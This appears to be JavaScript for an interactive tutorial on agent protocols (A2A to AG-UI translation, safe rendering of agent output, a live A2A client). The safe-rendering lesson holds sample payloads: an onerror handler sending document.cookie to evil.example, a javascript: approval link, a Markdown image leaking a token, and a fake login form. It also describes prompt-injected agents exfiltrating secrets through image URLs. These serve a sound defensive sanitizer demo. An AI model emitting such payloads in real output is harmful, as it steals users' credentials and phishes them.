    const su = r.statusUpdate;
    const state = su.status.state.replace("TASK_STATE_", "");
    (su.status.message ? su.status.message.parts : []).forEach(function (p) {
      const m = p.metadata || {};
      if (state === "INPUT_REQUIRED") return;
      if (m.adk_type === "function_call") {
        out.push({ type: "TOOL_CALL_START", toolCallId: p.data.id, toolCallName: p.data.name });
        out.push({ type: "TOOL_CALL_ARGS", toolCallId: p.data.id, delta: JSON.stringify(p.data.args) });
        out.push({ type: "TOOL_CALL_END", toolCallId: p.data.id });
      } else if (m.adk_type === "function_response") {
        out.push({ type: "TOOL_CALL_RESULT", messageId: "msg-" + PG.hex(2), toolCallId: p.data.id, content: JSON.stringify(p.data.response) });
      } else if (p.text) {
        const id = "msg-" + PG.hex(2);
        out.push({ type: "TEXT_MESSAGE_START", messageId: id, role: "assistant" });
        out.push({ type: "TEXT_MESSAGE_CONTENT", messageId: id, delta: p.text });
        out.push({ type: "TEXT_MESSAGE_END", messageId: id });
      }
    });
    if (state === "INPUT_REQUIRED") {
      const call = su.status.message.parts[0].data;
      out.push({ type: "RUN_FINISHED", threadId: st.thread, runId: st.run, outcome: { type: "interrupt", interrupts: [{ id: "int-" + call.id, reason: "approval", message: "Approve " + call.args.service + " " + call.args.version + " → " + call.args.environment + "?", toolCallId: call.id, responseSchema: { type: "object", properties: { approved: { type: "boolean" }, note: { type: "string" } }, required: ["approved"] } }] } });
    }
    return out;
  }

  PG.lesson({
    id: "fe-agui",
    track: "frontends",
    title: "AG-UI: an event protocol for screens",
    short: "AG-UI",
    thesis: "A2A is shaped for agents talking to agents: tasks, durable ids, opaque peers. A screen wants finer, render-ready events: text as it is typed, tool calls as they start, state patches, and interrupts it can turn into forms. AG-UI is that protocol, and a backend translates between the two.",
    refs: "AG-UI 1.0 (ag-ui-protocol: EventType, RunAgentInput, RunFinishedOutcome, Interrupt, ResumeEntry) · ag-ui-adk (ADKAgent, add_adk_fastapi_endpoint) · A2A spec §3.1.2",
    brief: `
      <h2>Two protocols, two audiences</h2>
      <div class="table-wrap"><table class="tbl"><thead><tr><th>A2A</th><th>AG-UI</th></tr></thead><tbody>
        <tr><td>agent ↔ agent; opaque peers</td><td>agent backend ↔ the user's screen</td></tr>
        <tr><td>Task, with a durable id and state machine</td><td>Thread (<code>threadId</code>) and runs (<code>runId</code>)</td></tr>
        <tr><td><code>statusUpdate</code> / <code>artifactUpdate</code></td><td><code>TEXT_MESSAGE_START/CONTENT/END</code>, <code>TOOL_CALL_START/ARGS/END/RESULT</code>, <code>STATE_SNAPSHOT/DELTA</code> (JSON Patch), <code>STEP_*</code>, <code>REASONING_*</code></td></tr>
        <tr><td><code>INPUT_REQUIRED</code></td><td><code>RUN_FINISHED</code> with <code>outcome: {type: "interrupt", interrupts: [{id, reason, message, toolCallId, responseSchema}]}</code></td></tr>
        <tr><td>function response on the same task</td><td>a new run with <code>resume: [{interruptId, status: "resolved", payload}]</code></td></tr>
        <tr><td><code>CANCELED</code> / <code>FAILED</code></td><td><code>outcome: {type: "cancelled"}</code> / <code>RUN_ERROR {message, code}</code></td></tr>
      </tbody></table></div>
      <p>Field names are camelCase on the wire (<code>threadId</code>, <code>toolCallName</code>, <code>interruptId</code>). The <code>responseSchema</code> on an interrupt is JSON Schema, so a UI can generate the approval form without knowing the tool.</p>
      <h2>Where the translation lives</h2>
      <p>In the backend between the screen and the agents. For an ADK agent served in-process, the <code>ag-ui-adk</code> package wraps it (<code>ADKAgent(adk_agent=…, app_name=…)</code> plus <code>add_adk_fastapi_endpoint(app, agent, path="/")</code>). For remote A2A agents, the BFF consumes A2A and emits AG-UI, which is what the lab below does with this repo's real frames. CopilotKit is the best-known front end that renders AG-UI.</p>
      <div class="note"><span class="note-label">Also emerging</span><strong>A2UI</strong>: agents send declarative UI components (not code) for the client to render with its own trusted widgets. <code>ag-ui-adk</code> already ships an A2UI tool. It is young; check its repository for the current format before building on it.</div>`,
    lab: function (bench) {
      const a = PG.lab(bench, "Translate this repo's A2A stream into AG-UI", "Lab · protocol translator");
      const frames = sampleFrames();
      const left = h("div", { class: "stack" }), right = h("div", { class: "stack" });
      const res = h("div", { class: "result", text: "Step through the frames the concierge really sends." });
      let i = 0; const st = {};
      const stepBtn = btn("Next A2A frame →", "primary", step);
      const resumeBtn = btn("User approves → resume", "server", resume);
      resumeBtn.disabled = true;
      a.body.appendChild(h("div", { class: "row" }, stepBtn, btn("Reset", "small", reset), resumeBtn));
      a.body.appendChild(h("div", { class: "grid2" }, h("div", { class: "stack" }, h("p", { class: "eyebrow", text: "A2A in (from ops-concierge)" }), left), h("div", { class: "stack" }, h("p", { class: "eyebrow", text: "AG-UI out (to the screen)" }), right)));
      a.body.appendChild(res);
      function pre(obj, hl) { return h("pre", { class: "code", html: PG.jsonHTML(obj, hl) }); }
      function reset() { i = 0; left.innerHTML = ""; right.innerHTML = ""; stepBtn.disabled = false; resumeBtn.disabled = true; result(res, "", "Step through the frames the concierge really sends."); }
      function step() {
        if (i >= frames.length) return;
        const f = frames[i++];
        left.innerHTML = ""; left.appendChild(pre(f, ["statusUpdate", "task", "adk_type", "state"]));
        const ev = aguiFor(f, st);
        right.innerHTML = "";
        if (!ev.length) right.appendChild(h("div", { class: "small muted", text: "(nothing for the screen: a WORKING heartbeat)" }));
        ev.forEach(function (e) { right.appendChild(pre(e, ["type", "outcome", "interrupts"])); });
        if (i === frames.length) {
          stepBtn.disabled = true; resumeBtn.disabled = false;
          result(res, "info", "<code>INPUT_REQUIRED</code> became <code>RUN_FINISHED</code> with an <b>interrupt</b>. The <code>responseSchema</code> is enough to render a form, and <code>toolCallId</code> ties it to the call the agent is waiting on.");
        }
      }
      function resume() {
        resumeBtn.disabled = true;
        const ui = { threadId: st.thread, runId: "run-" + PG.hex(2), messages: [], resume: [{ interruptId: "int-fc-requ", status: "resolved", payload: { approved: true, note: "Change window confirmed" } }] };
        const a2a = SPEC.rpc("SendStreamingMessage", { message: SPEC.msg("user", [{ data: { id: "fc-requ", name: "request_change_approval", response: { ticket_id: "CHG-B44BD1CF", approved: true, note: "Change window confirmed" } }, metadata: { adk_type: "function_response" } }], { taskId: "4729…", contextId: "1bc3…" }) });
        right.innerHTML = ""; left.innerHTML = "";
        right.appendChild(h("p", { class: "small muted", text: "The screen sends a new run that resumes the interrupt:" }));
        right.appendChild(pre(ui, ["resume", "interruptId", "payload"]));
        left.appendChild(h("p", { class: "small muted", text: "The backend turns it into the A2A answer on the same task:" }));
        left.appendChild(pre(a2a, ["taskId", "adk_type", "response"]));
        result(res, "ok", "<b>Round trip.</b> AG-UI <code>resume[].payload</code> → A2A function response on the same <code>taskId</code>. The screen never needed to know about tasks, ADK's DataPart convention, or the agent behind the concierge.");
      }
    },
    quiz: [
      { q: "In AG-UI 1.0, how does a run say it is waiting for a human?",
        opts: ["RUN_ERROR", "RUN_FINISHED with outcome {type: \"interrupt\", interrupts: […]}", "STATE_DELTA", "TEXT_MESSAGE_END"],
        a: 1, why: "Interrupts carry id, reason, message, toolCallId and an optional responseSchema." },
      { q: "And how does the screen answer it?",
        opts: ["A new run with resume: [{interruptId, status: \"resolved\", payload}]", "A2A CancelTask", "A STATE_SNAPSHOT", "Nothing: interrupts time out"],
        a: 0, why: "ResumeEntry {interruptId, status resolved|cancelled, payload}." },
      { q: "Where does A2A ↔ AG-UI translation usually live?",
        opts: ["In the browser", "In the backend between screen and agents (e.g. ag-ui-adk or a BFF)", "In the Agent Card", "In the mesh"],
        a: 1, why: "The backend speaks A2A to agents and AG-UI to the screen." },
    ],
  });

  /* ════════════════════════════════════════════════════════════════════
   * Lesson: Agent output in the browser
   * ════════════════════════════════════════════════════════════════════ */
  const SAMPLES = {
    ok: "**Release ready.** See the [runbook](https://docs.example.com/runbook) for checkout-api 2.14.0.",
    xss: "Scan passed <img src=x onerror=\"fetch('https://evil.example/c?='+document.cookie)\">",
    js: "Click [here to approve](javascript:fetch('/approve?all=1')) and you're done.",
    exfil: "Done! ![status](https://evil.example/pixel.png?d=ticket%20CHG-B44BD1CF%20token%20eyJhbGci)",
    html: "<form action=\"https://evil.example/login\"><b>Session expired.</b> Password: <input name=p type=password><button>Sign in</button></form>",
  };
  function mdToHtml(s) {
    return s.replace(/!\[([^\]]*)\]\(([^)]+)\)/g, '<img alt="$1" src="$2">')
      .replace(/\[([^\]]+)\]\(([^)]+)\)/g, '<a href="$2">$1</a>')
      .replace(/\*\*([^*]+)\*\*/g, "<strong>$1</strong>");
  }
  /* A real allowlist sanitizer: DOMParser builds an inert document (no script
   * runs, no image loads), then only known-safe elements and attributes survive. */
  function sanitize(html, opts) {
    const doc = new DOMParser().parseFromString("<div>" + html + "</div>", "text/html");
    const ALLOW = { STRONG: [], EM: [], CODE: [], P: [], BR: [], UL: [], OL: [], LI: [], A: ["href"], IMG: ["src", "alt"] };
    const removed = [];
    (function walk(node) {
      Array.from(node.children).forEach(function (el) {
        if (!ALLOW[el.tagName]) {
          removed.push("<" + el.tagName.toLowerCase() + ">");
          el.replaceWith(doc.createTextNode(el.textContent));
          return;
        }
        Array.from(el.attributes).forEach(function (at) {
          if (ALLOW[el.tagName].indexOf(at.name) < 0) { removed.push(at.name + "=… on <" + el.tagName.toLowerCase() + ">"); el.removeAttribute(at.name); }
        });
        if (el.tagName === "A") {
          const href = el.getAttribute("href") || "";
          if (!/^https?:\/\//i.test(href)) { removed.push("href=" + href.slice(0, 24) + "…"); el.removeAttribute("href"); }
          else { el.setAttribute("rel", "noopener noreferrer"); el.setAttribute("target", "_blank"); el.setAttribute("title", href); }
        }
        if (el.tagName === "IMG" && opts.blockImages) {
          removed.push("remote image " + (el.getAttribute("src") || "").slice(0, 40) + "…");
          el.replaceWith(doc.createTextNode("[image: " + (el.getAttribute("alt") || "") + " — blocked]"));
          return;
        }
        walk(el);
      });
    })(doc.body.firstChild);
    return { html: doc.body.firstChild.innerHTML, removed: removed };
  }
  function analyse(html) {
    const doc = new DOMParser().parseFromString("<div>" + html + "</div>", "text/html");
    const risks = [];
    doc.querySelectorAll("*").forEach(function (el) {
      Array.from(el.attributes).forEach(function (at) { if (/^on/i.test(at.name)) risks.push("would run JavaScript: " + at.name + " on <" + el.tagName.toLowerCase() + ">"); });
      if (el.tagName === "A" && /^javascript:/i.test(el.getAttribute("href") || "")) risks.push("a click would run JavaScript (javascript: link)");
      if (el.tagName === "IMG" && /^https?:/i.test(el.getAttribute("src") || "")) risks.push("the browser would request " + el.getAttribute("src").slice(0, 60) + "… with no click (data leaves in the URL)");
      if (el.tagName === "FORM") risks.push("a form posting to " + el.getAttribute("action") + " (phishing inside your app's frame)");
      if (el.tagName === "SCRIPT") risks.push("a <script> element");
    });
    return risks;
  }
  PG.lesson({
    id: "fe-safe",
    track: "frontends",
    title: "Agent output in the browser",
    short: "Rendering safely",
    thesis: "Text from an agent is untrusted input that you are about to put on a screen. Rendered carelessly it can run script, phish your users inside your own app, or quietly leak data through an image URL, without anyone clicking anything.",
    refs: "Spec §13.4 input validation · §14.1.1 (sanitize content, validate file references) · OWASP XSS prevention · Content-Security-Policy",
    brief: `
      <h2>The rules</h2>
      <ul>
        <li><strong>Never <code>innerHTML</code> agent text.</strong> Render Markdown to HTML, then pass it through an <em>allowlist</em> sanitizer (only known elements and attributes survive). Blocklists miss things.</li>
        <li><strong>Links:</strong> only <code>http(s)</code>; show the real destination; open with <code>rel="noopener noreferrer"</code>. A <code>javascript:</code> link is code.</li>
        <li><strong>Images are requests.</strong> A prompt-injected agent can write <code>![](https://evil.example/p.png?d=SECRET)</code>; the browser fetches it on render and the secret leaves in the URL. Block remote images, proxy them through an allowlist, or set CSP <code>img-src</code>.</li>
        <li><strong>HTML or file artifacts</strong> go in a sandboxed <code>iframe</code> (no <code>allow-scripts</code>, no <code>allow-same-origin</code>), or are offered as downloads, never inlined.</li>
        <li><strong>Defence in depth:</strong> a strict Content-Security-Policy (<code>script-src 'self'</code>, no inline script, <code>connect-src</code> to your own backend) limits what a missed bug can do.</li>
      </ul>
      <h2>Tokens in a browser</h2>
      <p>Best: none. A BFF keeps tokens server-side and gives the page an <code>HttpOnly; Secure; SameSite=Lax</code> session cookie (then protect state-changing calls against CSRF). If the page must hold a bearer token, keep it in memory, short-lived; <code>localStorage</code> is readable by any script that gets in, including through the holes above.</p>`,
    lab: function (bench) {
      const a = PG.lab(bench, "Render what the agent sent", "Lab · sanitizer (real, runs in your browser)");
      const cfg = { sample: "xss", sanitize: false, blockImages: false };
      const frame = h("iframe", { sandbox: "", title: "Rendered agent output (sandboxed: no scripts, no same-origin)", style: { width: "100%", height: "110px", border: "1px solid var(--rule)", borderRadius: "6px", background: "#fff" } });
      const src = h("pre", { class: "code wrap" });
      const outHtml = h("pre", { class: "code wrap" });
      const res = h("div", { class: "result" });
      a.body.appendChild(h("div", { class: "stack" },
        h("div", { class: "row" }, h("span", { class: "small muted", text: "The agent replied with:" }),
          PG.seg([{ v: "ok", label: "honest Markdown" }, { v: "xss", label: "onerror handler" }, { v: "js", label: "javascript: link" }, { v: "exfil", label: "leaky image" }, { v: "html", label: "fake login form" }], cfg.sample, function (v) { cfg.sample = v; run(); }, "Sample")),
        h("div", { class: "row" }, PG.switch("fe-san", "Allowlist sanitizer", cfg.sanitize, function (v) { cfg.sanitize = v; run(); }),
          PG.switch("fe-img", "Block remote images", cfg.blockImages, function (v) { cfg.blockImages = v; run(); })),
        h("p", { class: "eyebrow", text: "Agent text" }), src,
        h("p", { class: "eyebrow", text: "HTML the page would insert" }), outHtml,
        h("p", { class: "eyebrow", text: "Preview (in a sandboxed iframe, so nothing here can actually run)" }), frame, res));
      function run() {
        const text = SAMPLES[cfg.sample];
        src.textContent = text;
        let html = mdToHtml(text), removed = [];
        if (cfg.sanitize || cfg.blockImages) {
          const s = cfg.sanitize ? sanitize(html, cfg) : { html: html, removed: [] };
          if (!cfg.sanitize && cfg.blockImages) { s.html = html.replace(/<img [^>]*>/g, "[image blocked]"); }
          html = s.html; removed = s.removed;
        }
        outHtml.textContent = html;
        frame.setAttribute("srcdoc", "<meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none'; style-src 'unsafe-inline'\"><body style=\"font:14px system-ui;margin:10px\">" + html + "</body>");
        const risks = analyse(html);
        if (!risks.length) result(res, "ok", "<b>✓ Safe to insert.</b>" + (removed.length ? " Removed: " + removed.map(PG.esc).join("; ") + "." : " Nothing needed removing."));
        else result(res, "warn", "<b>✗ In a normal page this would be dangerous:</b><br>• " + risks.map(PG.esc).join("<br>• ") + "<br><span class=\"small\">(Turn on the sanitizer" + (cfg.sample === "exfil" ? " and block remote images" : "") + ".)</span>");
      }
      run();
    },
    quiz: [
      { q: "Why is a Markdown image in agent output a data-leak risk?",
        opts: ["Images are large", "The browser requests the URL on render, so anything in it (e.g. a secret) leaves with no click", "Images can't be sanitized", "It isn't"],
        a: 1, why: "Block or proxy remote images; CSP img-src helps." },
      { q: "Which sanitizer approach is robust?",
        opts: ["Strip <script> tags", "An allowlist of elements and attributes, with link schemes checked", "Escape only quotes", "Trust Markdown"],
        a: 1, why: "Blocklists miss onerror, javascript:, forms, and new tricks." },
      { q: "Where should a production web UI keep the agent's access token?",
        opts: ["localStorage", "Server-side in a BFF; the page gets an HttpOnly session cookie", "In the URL", "In the Agent Card"],
        a: 1, why: "Nothing a script can read, so an XSS can't steal it." },
    ],
  });

  /* ════════════════════════════════════════════════════════════════════
   * Lesson: Drive your local agents from this page (live)
   * ════════════════════════════════════════════════════════════════════ */
  PG.lesson({
    id: "fe-live",
    track: "frontends",
    title: "Drive your own agents from this page",
    short: "Live: your agents",
    thesis: "Everything in this track, for real: this page becomes an A2A client of the repo's concierge running on your laptop. It reads the card, streams a release, renders the approval as a form, answers it, follows the deployment job, and finishes the task.",
    refs: "This repo: make run · servers/*_server.py (CORS) · common/a2a_wire.py · scripts/a2a_chain_probe.py does the same from Python",
    brief: `
      <h2>Before you press Connect</h2>
      <ol class="steps">
        <li>Run the agents. In the repo root, with <code>POC_FAKE_LLM=1</code> in <code>.env</code> (no API key needed): <code>make run</code>.</li>
        <li>Serve this site on localhost: <code>./a2a-proving-ground/serve.sh</code>, then open http://localhost:8765. A published HTTPS copy of this page can't reach <code>http://127.0.0.1</code>; browsers block that.</li>
        <li>The agents allow pages from <code>http://localhost</code> and <code>http://127.0.0.1</code> on any port. Serving from somewhere else? Set <code>CORS_ALLOW_ORIGINS</code> before <code>make run</code>.</li>
      </ol>
      <h2>What the page does</h2>
      <ul>
        <li><code>GET …/.well-known/agent-card.json</code>, then <code>SendStreamingMessage</code> with <code>fetch</code>, parsed with the buffered SSE parser from this track.</li>
        <li>ADK's tool calls and results arrive as <code>data</code> parts and are drawn as a timeline.</li>
        <li>At <code>INPUT_REQUIRED</code> it reads the pending long-running call. <code>request_change_approval</code> becomes an approval card; the answer goes back as a function response on the same task.</li>
        <li><code>start_deployment</code> returns a job handle with a <code>poll_url</code> on the specialist. The page polls it (that's the specialist's own <code>/ops</code> API, not A2A), then delivers the job's result as the function response, and the task completes.</li>
        <li><strong>Cancel</strong> sends <code>CancelTask</code>, not just an aborted fetch.</li>
      </ul>`,
    lab: function (bench) {
      const a = PG.lab(bench, "ops-concierge on your laptop", "Lab · live A2A client");
      const url = h("input", { class: "inline mono", type: "text", value: "http://127.0.0.1:8000/a2a/ops_concierge", "aria-label": "A2A endpoint", style: { width: "100%" } });
      const prompt = h("input", { class: "inline", type: "text", value: "Deploy checkout-api 2.14.0 to production", "aria-label": "Message", style: { flex: "1", minWidth: "200px" } });
      const cardBox = h("div", { class: "small" });
      const chat = h("div", { class: "chat" });
      const res = h("div", { class: "result", text: "Connect first." });
      const wire = PG.wire(a.body, { title: "Live wire (every frame the agent sent)" });
      const sendBtn = btn("Send", "primary", function () { start(prompt.value); });
      const cancelBtn = btn("Cancel task", "danger small", cancel);
      sendBtn.disabled = true; cancelBtn.disabled = true;
      a.body.insertBefore(h("div", { class: "stack" },
        h("div", { class: "row" }, url, btn("Connect", "client", connect)), cardBox,
        h("div", { class: "row" }, prompt, sendBtn, cancelBtn), chat, res), wire.el);
      const S = { task: null, ctx: null, state: null, tools: {}, pending: null, ctrl: null };
      function bubble(cls, kids) { const b = h("div", { class: "bubble " + cls }, kids); chat.appendChild(b); chat.scrollTop = chat.scrollHeight; return b; }
      function fail(e) {
        const https = location.protocol === "https:";
        result(res, "warn", "<b>Couldn't reach " + PG.esc(url.value) + "</b> (" + PG.esc(e.message || String(e)) + ").<br>" + (https
          ? "This page is served over HTTPS, and browsers block calls from it to <code>http://127.0.0.1</code>. Run the site locally: <code>./a2a-proving-ground/serve.sh</code>, then open http://localhost:8765."
          : "Is the concierge running? In the repo: <code>POC_FAKE_LLM=1</code> in <code>.env</code>, then <code>make run</code>. If it is, check the page's origin is allowed (<code>CORS_ALLOW_ORIGINS</code>; local pages are allowed by default)."));
      }
      async function connect() {
        cardBox.innerHTML = "";
        try {
          const r = await fetch(url.value.replace(/\/$/, "") + "/.well-known/agent-card.json");
          if (!r.ok) throw new Error("HTTP " + r.status);
          const card = await r.json();
          wire.add({ kind: "in", actor: "server", label: "Agent Card · " + card.name, status: String(r.status), body: card });
          cardBox.appendChild(h("div", { class: "row" }, h("b", { text: card.name }), h("span", { class: "chip mono", text: "v" + card.version }),
            (card.supportedInterfaces || []).map(function (i) { return h("span", { class: "chip", text: i.protocolBinding + " " + i.protocolVersion }); }),
            (card.skills || []).map(function (s) { return h("span", { class: "chip client", text: s.id }); })));
          cardBox.appendChild(h("div", { class: "muted", text: (card.description || "").slice(0, 200) }));
          sendBtn.disabled = false;
          result(res, "ok", "Connected. Send a release request.");
        } catch (e) { fail(e); }
      }
      async function stream(message) {
        const body = SPEC.rpc("SendStreamingMessage", { message: message }, PG.hex(4));
        wire.add({ actor: "client", label: "SendStreamingMessage" + (message.taskId ? " · resume task " + message.taskId.slice(0, 8) + "…" : ""), http: SPEC.post(new URL(url.value).pathname), body: body });
        S.ctrl = new AbortController();
        const r = await fetch(url.value, { method: "POST", signal: S.ctrl.signal,
          headers: { "Content-Type": "application/json", Accept: "text/event-stream", "A2A-Version": "1.0" }, body: JSON.stringify(body) });
        if (!r.ok) throw new Error("HTTP " + r.status);
        const ct = r.headers.get("content-type") || "";
        if (ct.indexOf("text/event-stream") < 0) { const j = await r.json(); wire.add({ kind: "in", actor: "server", label: "error", status: "error", body: j, open: true }); throw new Error((j.error && j.error.message) || "not a stream"); }
        const feed = sseParser(function (d) { onFrame(JSON.parse(d)); });
        const reader = r.body.pipeThrough(new TextDecoderStream()).getReader();
        for (;;) { const x = await reader.read(); if (x.done) break; feed(x.value); }
      }
      function onFrame(f) {
        if (f.error) { wire.add({ kind: "in", actor: "server", label: "JSON-RPC error " + f.error.code, status: String(f.error.code), body: f, open: true }); bubble("agent", "Error: " + f.error.message); return; }
        const r = f.result || {};
        const v = r.task || r.statusUpdate || r.artifactUpdate || r.message;
        if (r.task) { S.task = r.task.id; S.ctx = r.task.contextId; }
        const state = v && v.status ? v.status.state.replace("TASK_STATE_", "") : null;
        if (state) S.state = state;
        const parts = (v && v.status && v.status.message ? v.status.message.parts : r.artifactUpdate ? r.artifactUpdate.artifact.parts : []) || [];
        const what = parts.map(function (p) {
          const m = p.metadata || {};
          return m.adk_type === "function_call" ? "call " + p.data.name : m.adk_type === "function_response" ? "result " + p.data.name : p.text ? "text" : "";
        }).filter(Boolean).join(", ");
        wire.add({ kind: "evt", actor: "server", label: Object.keys(r)[0] + (state ? " · " + state : "") + (what ? " · " + what : ""), body: f });
        parts.forEach(function (p) {
          const m = p.metadata || {};
          if (m.adk_type === "function_call") {
            if (state === "INPUT_REQUIRED" && m.adk_is_long_running) S.pending = p.data;
            else if (state !== "INPUT_REQUIRED") bubble("tool", "🔧 " + p.data.name + " " + JSON.stringify(p.data.args || {}).slice(0, 90));
          } else if (m.adk_type === "function_response") {
            S.tools[p.data.name] = p.data.response;
            bubble("tool", "↩ " + p.data.name + " → " + JSON.stringify(p.data.response).slice(0, 90));
          } else if (p.text) bubble("agent", p.text);
        });
      }
      async function start(text) {
        chat.innerHTML = ""; S.task = S.ctx = S.pending = null; S.tools = {};
        bubble("me", text);
        await run(SPEC.msg("user", [text]));
      }
      async function run(message) {
        sendBtn.disabled = true; cancelBtn.disabled = false;
        S.pending = null;
        try { await stream(message); } catch (e) { if (e.name !== "AbortError") fail(e); sendBtn.disabled = false; return; }
        cancelBtn.disabled = !(S.state === "INPUT_REQUIRED" || S.state === "WORKING");
        if (S.state === "INPUT_REQUIRED" && S.pending) gate(S.pending);
        else if (S.state === "COMPLETED") { result(res, "ok", "<b>✓ Task COMPLETED.</b> Every frame is in the wire inspector below."); sendBtn.disabled = false; }
        else { result(res, "info", "Stream ended in <b>" + PG.esc(S.state || "?") + "</b>."); sendBtn.disabled = false; }
      }
      function answer(call, response) {
        return run(SPEC.msg("user", [{ data: { id: call.id, name: call.name, response: response }, metadata: { adk_type: "function_response" } }], { taskId: S.task, contextId: S.ctx }));
      }
      function gate(call) {
        if (call.name === "request_change_approval") {
          const g = call.args || {}, ticket = (S.tools.request_change_approval || {}).ticket_id;
          const note = h("input", { class: "inline", type: "text", value: "Approved from the proving ground", "aria-label": "Note" });
          const card = bubble("gate", [h("div", { class: "row" }, PG.stateChip("INPUT_REQUIRED"), h("b", { text: "Approval · " + (ticket || "") })),
            h("dl", { class: "kv" }, h("dt", { text: "change" }), h("dd", { text: (g.service || "") + " " + (g.version || "") + " → " + (g.environment || "") }), h("dt", { text: "risk" }), h("dd", { text: g.risk || "" }), h("dt", { text: "summary" }), h("dd", { text: g.summary || "" })),
            h("div", { class: "row" }, note,
              btn("Approve", "server small", function () { done(true); }), btn("Reject", "danger small", function () { done(false); }))]);
          result(res, "info", "The real agent is parked at <code>request_change_approval</code>. This card was built from the pending call's arguments.");
          function done(ok) { card.querySelectorAll("button").forEach(function (b) { b.disabled = true; }); answer(call, { ticket_id: ticket, approved: ok, decided_by: "proving-ground", note: note.value }); }
        } else if (call.name === "start_deployment") {
          const job = S.tools.start_deployment || {};
          const bar = h("div", { class: "lane-track" }, h("div", { class: "span", style: { left: "0", width: "0%", background: "var(--server)", transition: "width .4s" } }));
          const label = h("span", { class: "small", text: "polling " + (job.poll_url || "") });
          bubble("gate", [h("div", { class: "row" }, PG.stateChip("INPUT_REQUIRED"), h("b", { text: "Deployment job " + (job.job_id || "") })), bar, label]);
          result(res, "info", "Parked again, on the long-running job. Polling the specialist's job API, then delivering the result to the task.");
          poll(job, bar.firstChild, label, call);
        } else {
          const ta = h("textarea", { class: "inline mono", rows: 3, style: { width: "100%" }, text: "{}" });
          bubble("gate", [h("b", { text: "The agent is waiting on " + call.name }), ta, btn("Send response", "small", function () { try { answer(call, JSON.parse(ta.value)); } catch (e) { PG.toast("Not valid JSON", "err"); } })]);
        }
      }
      async function poll(job, fill, label, call) {
        try {
          for (let n = 0; n < 240; n++) {
            const r = await fetch(job.poll_url);
            const j = await r.json();
            fill.style.width = (j.progress || 0) + "%";
            label.textContent = j.stage + " · " + (j.progress || 0) + "%";
            if (j.state === "succeeded" || j.state === "failed") {
              wire.add({ kind: "in", actor: "server", label: "GET " + new URL(job.poll_url).pathname + " · " + j.state, status: String(r.status), body: j });
              return answer(call, j.result || { status: j.state, job_id: job.job_id });
            }
            await new Promise(function (ok) { setTimeout(ok, 1000); });
          }
        } catch (e) { fail(e); }
      }
      async function cancel() {
        if (!S.task) return;
        try {
          if (S.ctrl) S.ctrl.abort();
          const body = SPEC.rpc("CancelTask", { id: S.task }, PG.hex(4));
          wire.add({ actor: "client", label: "CancelTask " + S.task.slice(0, 8) + "…", body: body });
          const r = await fetch(url.value, { method: "POST", headers: { "Content-Type": "application/json", "A2A-Version": "1.0" }, body: JSON.stringify(body) });
          const j = await r.json();
          wire.add({ kind: "in", actor: "server", label: j.error ? "CancelTask error " + j.error.code : "CancelTask → " + ((j.result || {}).status || {}).state, status: j.error ? String(j.error.code) : "200", body: j, open: true });
          bubble("agent", j.error ? "Cancel refused: " + j.error.message : "Task canceled.");
          cancelBtn.disabled = true; sendBtn.disabled = false;
          result(res, j.error ? "warn" : "ok", j.error ? "The agent refused the cancel (see the wire)." : "<b>Canceled.</b> With <code>CANCEL_PROPAGATION=1</code> on both agents the specialist's task and ticket go too (Agents in production → Cancel across hops).");
        } catch (e) { fail(e); }
      }
    },
    quiz: [
      { q: "The live page answers the deployment-job gate with what?",
        opts: ["The text “done”", "A function response carrying the job's result, on the same task", "GetTask", "A new task"],
        a: 1, why: "Same pattern as the approval: the pending call's id, its name, and a response." },
      { q: "Why does the published HTTPS copy of this site fail to reach your local agent?",
        opts: ["CORS always blocks localhost", "Browsers block requests from an https page to http://127.0.0.1 (mixed content / private network)", "The agent requires gRPC", "A2A forbids browsers"],
        a: 1, why: "Serve the page locally over http://localhost, which the agents' default CORS policy allows." },
    ],
  });
})();
